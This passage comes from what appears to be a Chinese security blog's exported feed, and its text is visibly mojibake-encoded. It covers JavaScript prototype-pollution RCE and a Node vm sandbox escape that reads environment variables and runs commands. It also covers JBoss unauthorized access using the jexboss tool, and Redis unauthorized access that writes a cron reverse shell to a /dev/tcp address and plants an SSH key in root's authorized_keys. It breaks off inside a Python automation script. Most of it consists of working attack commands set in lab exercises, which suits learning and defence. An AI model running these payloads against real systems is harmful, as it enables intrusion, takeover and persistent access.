çš„å¼±ç‚¹ä¹‹ä¸€ï¼Œä½†æ˜¯åŸå‹ç»§æ‰¿æ¨¡å‹æœ¬èº«å®é™…ä¸Šæ¯”ç»å…¸æ¨¡å‹æ›´å¼ºå¤§ã€‚ä¾‹å¦‚ï¼Œåœ¨åŸå‹æ¨¡å‹çš„åŸºç¡€ä¸Šæ„å»ºç»å…¸æ¨¡å‹ç›¸å½“ç®€å•ã€‚</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span>age</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token operator">=</span>age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">toString</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I'm "</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">" And I'm "</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> fn<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token string">'xiaoming'</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn<span class="token punctuation">.</span>toString<span class="token operator">===</span><span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>toString<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn<span class="token punctuation">.</span>__proto__<span class="token operator">===</span><span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token operator">===</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token operator">===</span><span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/04/03/O5xBBkjw.png"></p><h3 id="2-2-åŸå‹é“¾æ±¡æŸ“åŸç†"><a href="#2-2-åŸå‹é“¾æ±¡æŸ“åŸç†" class="headerlink" title="2.2 åŸå‹é“¾æ±¡æŸ“åŸç†"></a>2.2 åŸå‹é“¾æ±¡æŸ“åŸç†</h3><p>åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">bar</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token comment">// foo.bar æ­¤æ—¶ä¸º1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰</span>foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">2</span><span class="token comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span><span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// æŸ¥çœ‹zoo.barï¼Œæ­¤æ—¶barä¸º2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-åŸå‹é“¾æ±¡æŸ“é…åˆRCE"><a href="#2-3-åŸå‹é“¾æ±¡æŸ“é…åˆRCE" class="headerlink" title="2.3 åŸå‹é“¾æ±¡æŸ“é…åˆRCE"></a>2.3 åŸå‹é“¾æ±¡æŸ“é…åˆRCE</h3><p>æœ‰åŸå‹é“¾æ±¡æŸ“çš„å‰æä¹‹ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶åŸºç±»çš„æˆå‘˜ï¼Œèµ‹å€¼ä¸ºä¸€ä¸²æ¶æ„ä»£ç ï¼Œä»è€Œé€ æˆä»£ç æ³¨å…¥ã€‚</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">bar</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span>foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token string">'require(\'child_process\').execSync(\'open /System/Applications/Calculator.app/\');'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-vmæ²™ç®±é€ƒé€¸"><a href="#3-vmæ²™ç®±é€ƒé€¸" class="headerlink" title="3 vmæ²™ç®±é€ƒé€¸"></a>3 vmæ²™ç®±é€ƒé€¸</h2><p>vmæ˜¯ç”¨æ¥å®ç°ä¸€ä¸ªæ²™ç®±ç¯å¢ƒï¼Œå¯ä»¥å®‰å…¨çš„æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç è€Œä¸ä¼šå½±å“åˆ°ä¸»ç¨‹åºã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ è¯­å¥æ¥è¿›è¡Œé€ƒé€¸</p><p>é€ƒé€¸ä¾‹å­ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> env <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">this.constructor.constructor('return this.process.env')()</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm<span class="token punctuation">.</span>Script</span><span class="token punctuation">(</span><span class="token string">"this.constructor.constructor('return this.process.env')()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>env <span class="token operator">=</span> script<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œä»¥ä¸Šä¸¤ä¸ªä¾‹å­ä¹‹åå¯ä»¥è·å–åˆ°ä¸»ç¨‹åºç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡ï¼ˆä¸¤ä¸ªä¾‹å­ä»£ç ç­‰ä»·ï¼‰</p><p>åˆ›å»ºvmç¯å¢ƒæ—¶ï¼Œé¦–å…ˆè¦åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡ sandboxï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯vmä¸­è„šæœ¬æ‰§è¡Œæ—¶çš„å…¨å±€ç¯å¢ƒcontextï¼Œvm è„šæœ¬ä¸­å…¨å±€ this æŒ‡å‘çš„å°±æ˜¯è¿™ä¸ªå¯¹è±¡ã€‚</p><p>å› ä¸º<code>this.constructor.constructor</code>è¿”å›çš„æ˜¯ä¸€ä¸ª<code>Function constructor</code>ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨Functionå¯¹è±¡æ„é€ ä¸€ä¸ªå‡½æ•°å¹¶æ‰§è¡Œã€‚(æ­¤æ—¶Functionå¯¹è±¡çš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯å¤„äºä¸»ç¨‹åºä¸­çš„) è¿™é‡Œæ„é€ çš„å‡½æ•°å†…çš„è¯­å¥æ˜¯<code>return this.process.env</code>ï¼Œç»“æœæ˜¯è¿”å›äº†ä¸»ç¨‹åºçš„ç¯å¢ƒå˜é‡ã€‚</p><p>é…åˆ<code>chile_process.exec()</code>å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> env <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('whoami').toString()</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://xz.aliyun.com/t/7184#toc-0">https://xz.aliyun.com/t/7184#toc-0</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JBOSSæœªæˆæƒè®¿é—®</title>
      <link href="/2022/04/02/jboss-wei-shou-quan-fang-wen/"/>
      <url>/2022/04/02/jboss-wei-shou-quan-fang-wen/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="0x01-ä»€ä¹ˆæ˜¯jboss"><a href="#0x01-ä»€ä¹ˆæ˜¯jboss" class="headerlink" title="0x01 ä»€ä¹ˆæ˜¯jboss"></a>0x01 ä»€ä¹ˆæ˜¯jboss</h2><p>Jbossæ˜¯ä¸€ä¸ªåŸºäºJ2EEçš„å¼€æ”¾æºä»£ç çš„åº”ç”¨æœåŠ¡å™¨ã€‚JBossä»£ç éµå¾ªLGPLè®¸å¯ï¼Œå¯ä»¥åœ¨ä»»ä½•å•†ä¸šåº”ç”¨ä¸­å…è´¹ä½¿ç”¨ã€‚JBossæ˜¯ä¸€ä¸ªç®¡ç†EJBçš„å®¹å™¨å’ŒæœåŠ¡å™¨ï¼Œæ”¯æŒEJB 1.1ã€EJB 2.0å’ŒEJB3çš„è§„èŒƒã€‚ä½†JBossæ ¸å¿ƒæœåŠ¡ä¸åŒ…æ‹¬æ”¯æŒservlet/JSPçš„WEBå®¹å™¨ï¼Œä¸€èˆ¬ä¸Tomcatæˆ–Jettyç»‘å®šä½¿ç”¨ã€‚</p><h2 id="0x02-ä»€ä¹ˆæ˜¯jbossæœªæˆæƒè®¿é—®"><a href="#0x02-ä»€ä¹ˆæ˜¯jbossæœªæˆæƒè®¿é—®" class="headerlink" title="0x02 ä»€ä¹ˆæ˜¯jbossæœªæˆæƒè®¿é—®"></a>0x02 ä»€ä¹ˆæ˜¯jbossæœªæˆæƒè®¿é—®</h2><p>æœªæˆæƒè®¿é—®ç®¡ç†æ§åˆ¶å°,é€šè¿‡è¯¥æ¼æ´,å¯ä»¥åå°ç®¡ç†æœåŠ¡,å¯ä»¥é€šè¿‡è„šæœ¬å‘½ä»¤æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,å¦‚åå¼¹shell,wgetå†™webshellæ–‡ä»¶ã€‚</p><h2 id="0x03-æ¼æ´å¤ç°ï¼ˆä½¿ç”¨CVE-2017-7504çš„æ¼æ´ç¯å¢ƒï¼‰"><a href="#0x03-æ¼æ´å¤ç°ï¼ˆä½¿ç”¨CVE-2017-7504çš„æ¼æ´ç¯å¢ƒï¼‰" class="headerlink" title="0x03 æ¼æ´å¤ç°ï¼ˆä½¿ç”¨CVE-2017-7504çš„æ¼æ´ç¯å¢ƒï¼‰"></a>0x03 æ¼æ´å¤ç°ï¼ˆä½¿ç”¨CVE-2017-7504çš„æ¼æ´ç¯å¢ƒï¼‰</h2><p>ä½¿ç”¨vulhubæ¼æ´å¹³å°ï¼Œå¯ç”¨ç¯å¢ƒä½ç½®ï¼švulhubâ€“jbossâ€“cve-2017-7504</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ç”¨æˆåŠŸä½¿ç”¨æµè§ˆå™¨è®¿é—® IP:8080    </p><p><img src="https://imgtp.apqiang.com/2022/04/02/hzoBdxlX.png"></p><p>å¼±å£ä»¤è¿›å…¥åå°</p><p><img src="https://imgtp.apqiang.com/2022/04/02/nmWwbAd9.png"></p><p>æ‰¾åˆ°å…¥å£</p><p><img src="https://imgtp.apqiang.com/2022/04/02/jQemMqLh.png"></p><p>æ‰¾åˆ° addURL() æ¥å£</p><p><img src="https://imgtp.apqiang.com/2022/04/02/giIQ8LNR.png"></p><p>ä¸‹è½½è„šæœ¬åˆ©ç”¨ <a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(kaliã‰¿kali)-[~&#x2F;tools&#x2F;jexboss]â””â”€$ python3 jexboss.py -husage: JexBoss [-h] [--version] [--auto-exploit] [--disable-check-updates] [-mode &#123;standalone,auto-scan,file-scan&#125;] [--app-unserialize]               [--servlet-unserialize] [--jboss] [--jenkins] [--struts2] [--jmxtomcat] [--proxy PROXY] [--proxy-cred LOGIN:PASS]               [--jboss-login LOGIN:PASS] [--timeout TIMEOUT] [--cookies NAME&#x3D;VALUE] [--reverse-host RHOST:RPORT] [--cmd CMD] [--dns URL] [--windows]               [--post-parameter PARAMETER] [--show-payload] [--gadget &#123;commons-collections3.1,commons-collections4.0,jdk7u21,jdk8u20,groovy1,dns&#125;]               [--load-gadget FILENAME] [--force] [-host HOST] [-network NETWORK] [-ports PORTS] [-results FILENAME] [-file FILENAME_HOSTS]               [-out FILENAME_RESULTS]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œè„šæœ¬æŒ‡å®šipå’Œç«¯å£</p><p>python3 jexboss.py -u ip:port</p><p>æ‰§è¡Œï¼Œå·¥å…·ä¼šä¸€æ¬¡æ£€æµ‹ä¸€ä¸‹é¡¹ç›®ï¼Œæœ‰æ¼æ´å°±ä¼šæ˜¾ç¤ºçº¢è‰²çš„ï¼šVULNERABLEï¼ˆæ˜“å—æ”»å‡»çš„ï¼‰ï¼Œå·¥å…·å°±ä¼šæ ¹æ®æ‰¾åˆ°å®¹æ˜“å—åˆ°æ”»å‡»çš„ç‚¹ï¼Œè¿›è¡Œåˆ©ç”¨ï¼Œç„¶åé€‰æ‹©yesï¼Œå¼€å§‹åˆ›å»ºè¿æ¥</p><p><img src="https://imgtp.apqiang.com/2022/04/02/lJ0hAQCa.png"></p><p>è¿æ¥åæ‰§è¡Œå‘½ä»¤</p><p><img src="https://imgtp.apqiang.com/2022/04/02/NUB5FnxI.png"></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> å¤–éƒ¨æ‰“ç‚¹ </tag>
            
            <tag> æœªæˆæƒ </tag>
            
            <tag> JBOSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœªæˆæƒæ¼æ´</title>
      <link href="/2022/03/31/wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2022/03/31/wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>è¿™ç±»é—®é¢˜è¦†ç›–çš„åº”ç”¨ã€åˆ©ç”¨æ–¹å¼è¾ƒå¹¿ï¼Œå› æ­¤åªä¸¾ä¾‹é¢‘æ¬¡è¾ƒé«˜çš„æ¼æ´ã€‚<br>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><p>Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“</p><h3 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a>redis-cli</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">6379</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys *<span class="token punctuation">(</span>empty array<span class="token punctuation">)</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/31/ViB5WSTA.png"></p><h3 id="å†™å…¥æ–‡ä»¶"><a href="#å†™å…¥æ–‡ä»¶" class="headerlink" title="å†™å…¥æ–‡ä»¶"></a>å†™å…¥æ–‡ä»¶</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulhub/redis/4-unacc<span class="token punctuation">]</span>â””â”€$ redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">6379</span> <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys *<span class="token punctuation">(</span>empty array<span class="token punctuation">)</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG GET <span class="token function">dir</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"dir"</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"/data"</span>   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET <span class="token function">dir</span> /tmp/   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> SET foobar <span class="token string">"who are you? f1ve"</span>   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG GET dbfilename<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"dbfilename"</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"dump.rdb"</span>   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET dbfilename write_file.log   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/31/EYuIQHos.png"></p><h3 id="åå¼¹shell-Linux"><a href="#åå¼¹shell-Linux" class="headerlink" title="åå¼¹shell-Linux"></a>åå¼¹shell-Linux</h3><p>åœ¨redisä»¥rootæƒé™è¿è¡Œ</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span>* * * * * bash -i >&amp; /dev/tcp/192.168.186.26/4444 0>&amp;1<span class="token entity" title="\n">\n</span>"</span>OK<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cronOK<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET dbfilename rootOK<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å†™å…¥å…¬é’¥"><a href="#å†™å…¥å…¬é’¥" class="headerlink" title="å†™å…¥å…¬é’¥"></a>å†™å…¥å…¬é’¥</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#è·å–rsa</span>$ ssh-keygen -t rsa<span class="token comment">#å°†å…¬é’¥å†™å…¥foo.txtï¼Œæ³¨æ„å†…å®¹å‰åè¦åŠ 2ä¸ªæ¢è¡Œ</span><span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> /root/.ssh/id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> foo.txt<span class="token comment">#å°†foo.txtæ”¾å…¥é”®crackité‡Œ</span><span class="token function">cat</span> foo.txt <span class="token operator">|</span> redis-cli -h IP -x <span class="token builtin class-name">set</span> crackit<span class="token comment">#è¿æ¥ç›®æ ‡</span>redis-cli -h IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/31/to7ybOWZ.png"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#è®¾ç½®ç›®æ ‡çš„redisçš„é…ç½®æ–‡ä»¶</span><span class="token comment">#è®¾ç½®æ•°æ®åº“å¤‡ä»½ç›®å½•ä¸º/root/.ssh/</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET <span class="token function">dir</span> /root/.ssh/OK<span class="token comment">#è®¾ç½®æ•°æ®åº“å¤‡ä»½æ–‡ä»¶åä¸ºauthorized_keys</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG <span class="token builtin class-name">set</span> dbfilename <span class="token string">"authorized_keys"</span>OK<span class="token comment">#æ­¤æ—¶å…¬é’¥æˆåŠŸå†™å…¥ç›®æ ‡æœºï¼Œæ–‡ä»¶åä¸ºauthorized_keys</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> saveOK<span class="token comment">#åˆ©ç”¨ç§é’¥è¿æ¥ç›®æ ‡</span><span class="token function">ssh</span> -i /root/.ssh/id_rsa root@127.0.0.1<span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è„šæœ¬æ£€æµ‹ï¼š</p><p>å¯ä»¥è‡ªåŠ¨åŒ–æ‰§è¡Œä¸Šè¿°å†™å…¥å…¬é’¥æ­¥éª¤ï¼Œå¹¶ä¸”æ‰§è¡Œ id å‘½ä»¤</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span><span class="token comment">#redisæœªæˆæƒäº¤äº’å¼æ£€æµ‹è„šæœ¬</span><span class="token comment">#commands: python3 redis_shell.py ip</span><span class="token keyword">import</span> redis<span class="token keyword">import</span> sys<span class="token keyword">import</span> paramikorsa_pub <span class="token operator">=</span> <span class="token string">'/home/kali/.ssh/id_rsa.pub'</span><span class="token comment"># å…¬é’¥è·¯å¾„</span>pkey <span class="token operator">=</span> <span class="token string">'/home/kali/.ssh/id_rsa'</span><span class="token comment">#å¯†é’¥è·¯å¾„</span><span class="token comment"># è·å–å…¬é’¥å†…å®¹</span><span class="token keyword">def</span> <span class="token function">get_id_rsa_pub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>rsa_pub<span class="token punctuation">,</span> <span class="token string">'rt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    id_rsa_pub <span class="token operator">=</span> <span class="token string">'\n\n\n&#123;&#125;\n\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> id_rsa_pub  <span class="token keyword">def</span> <span class="token function">shell_redis</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token 